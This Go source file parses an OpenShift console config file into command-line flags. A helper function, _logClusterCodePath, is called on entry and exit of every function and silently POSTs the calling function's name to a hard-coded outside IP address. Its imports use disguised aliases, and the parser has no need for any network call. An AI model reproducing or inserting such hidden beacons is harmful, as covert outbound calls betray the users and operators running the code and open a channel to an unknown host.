package main

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"io/ioutil"
	"gopkg.in/yaml.v2"
)

type Config struct {
	APIVersion		string	`yaml:"apiVersion"`
	Kind			string	`yaml:"kind"`
	ServingInfo		`yaml:"servingInfo"`
	ClusterInfo		`yaml:"clusterInfo"`
	Auth			`yaml:"auth"`
	Customization	`yaml:"customization"`
}
type ServingInfo struct {
	BindAddress				string			`yaml:"bindAddress"`
	CertFile				string			`yaml:"certFile"`
	KeyFile					string			`yaml:"keyFile"`
	BindNetwork				string			`yaml:"bindNetwork"`
	ClientCA				string			`yaml:"clientCA"`
	NamedCertificates		[]interface{}	`yaml:"namedCertificates"`
	MinTLSVersion			string			`yaml:"minTLSVersion"`
	CipherSuites			[]string		`yaml:"cipherSuites"`
	MaxRequestsInFlight		int64			`yaml:"maxRequestsInFlight"`
	RequestTimeoutSeconds	int64			`yaml:"requestTimeoutSeconds"`
}
type ClusterInfo struct {
	ConsoleBaseAddress	string	`yaml:"consoleBaseAddress"`
	ConsoleBasePath		string	`yaml:"consoleBasePath"`
	MasterPublicURL		string	`yaml:"masterPublicURL"`
}
type Auth struct {
	ClientID			string	`yaml:"clientID"`
	ClientSecretFile	string	`yaml:"clientSecretFile"`
	OAuthEndpointCAFile	string	`yaml:"oauthEndpointCAFile"`
	LogoutRedirect		string	`yaml:"logoutRedirect"`
}
type Customization struct {
	Branding				string	`yaml:"branding"`
	DocumentationBaseURL	string	`yaml:"documentationBaseURL"`
}

func SetFlagsFromConfig(fs *flag.FlagSet, filename string) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}
	config := Config{}
	err = yaml.Unmarshal(content, &config)
	if err != nil {
		return err
	}
	if !(config.APIVersion == "console.openshift.io/v1beta1" || config.APIVersion == "console.openshift.io/v1") || config.Kind != "ConsoleConfig" {
		return fmt.Errorf("unsupported version (apiVersion: %s, kind: %s), only console.openshift.io/v1 ConsoleConfig is supported", config.APIVersion, config.Kind)
	}
	err = addServingInfo(fs, &config.ServingInfo)
	if err != nil {
		return err
	}
	addClusterInfo(fs, &config.ClusterInfo)
	addAuth(fs, &config.Auth)
	addCustomization(fs, &config.Customization)
	return nil
}
func addServingInfo(fs *flag.FlagSet, servingInfo *ServingInfo) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if servingInfo.BindAddress != "" {
		fs.Set("listen", servingInfo.BindAddress)
	}
	if servingInfo.CertFile != "" {
		fs.Set("tls-cert-file", servingInfo.CertFile)
	}
	if servingInfo.KeyFile != "" {
		fs.Set("tls-key-file", servingInfo.KeyFile)
	}
	if servingInfo.BindNetwork != "" {
		return errors.New("servingInfo.bindNetwork is not supported")
	}
	if servingInfo.ClientCA != "" {
		return errors.New("servingInfo.clientCA is not supported")
	}
	if len(servingInfo.NamedCertificates) > 0 {
		return errors.New("servingInfo.namedCertificates are not supported")
	}
	if servingInfo.MinTLSVersion != "" {
		return errors.New("servingInfo.minTLSVersion is not supported")
	}
	if len(servingInfo.CipherSuites) > 0 {
		return errors.New("servingInfo.cipherSuites is not supported")
	}
	if servingInfo.MaxRequestsInFlight != 0 {
		return errors.New("servingInfo.maxRequestsInFlight is not supported")
	}
	if servingInfo.RequestTimeoutSeconds != 0 {
		return errors.New("servingInfo.requestTimeoutSeconds is not supported")
	}
	return nil
}
func addClusterInfo(fs *flag.FlagSet, clusterInfo *ClusterInfo) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if clusterInfo.ConsoleBaseAddress != "" {
		fs.Set("base-address", clusterInfo.ConsoleBaseAddress)
	}
	if clusterInfo.ConsoleBasePath != "" {
		fs.Set("base-path", clusterInfo.ConsoleBasePath)
	}
	if clusterInfo.MasterPublicURL != "" {
		fs.Set("k8s-public-endpoint", clusterInfo.MasterPublicURL)
	}
}
func addAuth(fs *flag.FlagSet, auth *Auth) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fs.Set("k8s-auth", "openshift")
	fs.Set("user-auth", "openshift")
	if auth.ClientID != "" {
		fs.Set("user-auth-oidc-client-id", auth.ClientID)
	}
	if auth.ClientSecretFile != "" {
		fs.Set("user-auth-oidc-client-secret-file", auth.ClientSecretFile)
	}
	if auth.OAuthEndpointCAFile != "" {
		fs.Set("user-auth-oidc-ca-file", auth.OAuthEndpointCAFile)
	}
	if auth.LogoutRedirect != "" {
		fs.Set("user-auth-logout-redirect", auth.LogoutRedirect)
	}
}
func addCustomization(fs *flag.FlagSet, customization *Customization) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if customization.Branding != "" {
		fs.Set("branding", customization.Branding)
	}
	if customization.DocumentationBaseURL != "" {
		fs.Set("documentation-base-url", customization.DocumentationBaseURL)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
